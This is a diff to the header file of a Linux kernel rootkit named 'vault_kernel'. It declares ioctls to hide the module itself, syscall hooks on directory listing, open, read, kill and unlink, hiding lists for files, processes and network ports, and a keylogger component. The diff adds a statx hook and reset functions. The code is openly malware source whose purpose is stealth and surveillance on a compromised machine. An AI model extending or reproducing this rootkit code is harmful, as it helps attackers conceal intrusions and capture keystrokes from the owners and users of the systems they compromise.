@@ -43,7 +43,7 @@
 
 /* -- Module metadata -- */
 #define VAULT_KERNEL_NAME    "vault_kernel"
-#define VAULT_KERNEL_VERSION "3.1"
+#define VAULT_KERNEL_VERSION "3.2"
 #define VAULT_KERNEL_AUTHOR  "ruby570bocadito"
 #define VAULT_KERNEL_TAG     "[vault_kernel]"
 
@@ -75,6 +75,7 @@
 #define IOCTL_MODULE_HIDE      _IO(VAULT_KERNEL_MAGIC, 0x0D)
 #define IOCTL_MODULE_UNHIDE    _IO(VAULT_KERNEL_MAGIC, 0x0E)
 #define IOCTL_GET_STATS        _IOR(VAULT_KERNEL_MAGIC, 0x0F, char[4096])
+#define IOCTL_RESET_ALL        _IO(VAULT_KERNEL_MAGIC, 0x10)
 
 /* ================================================================
  * Syscall ABI compatibility (x86_64)
@@ -128,6 +129,7 @@ extern unsigned long vk_load_jiffies;
 #define HOOKIDX_READ        3
 #define HOOKIDX_KILL        4
 #define HOOKIDX_UNLINKAT    5
+#define HOOKIDX_STATX       6
 
 /* Exposed arrays for ioctl listing */
 extern char hidden_files[MAX_HIDDEN_FILES][256];
@@ -154,10 +156,12 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs);
 asmlinkage long hooked_getdents(const struct pt_regs *regs);
 asmlinkage long hooked_openat(const struct pt_regs *regs);
 asmlinkage long hooked_unlinkat(const struct pt_regs *regs);
+asmlinkage long hooked_statx(const struct pt_regs *regs);
 void file_hide_add(const char *name);
 void file_hide_del(const char *name);
 int file_hide_init(void);
 void file_hide_cleanup(void);
+void file_hide_reset(void);
 int is_file_hidden(const char *name);
 
 /* proc_hide.c */
@@ -165,6 +169,7 @@ void proc_hide_add(int pid);
 void proc_hide_del(int pid);
 int proc_hide_init(void);
 void proc_hide_cleanup(void);
+void proc_hide_reset(void);
 int is_pid_hidden(int pid);
 int is_proc_pid_hidden(const char *d_name);
 asmlinkage long hooked_kill(const struct pt_regs *regs);
@@ -174,6 +179,7 @@ void net_hide_add_port(uint16_t port);
 void net_hide_del_port(uint16_t port);
 int net_hide_init(void);
 void net_hide_cleanup(void);
+void net_hide_reset(void);
 asmlinkage long hooked_read(const struct pt_regs *regs);
 
 /* keylogger.c */
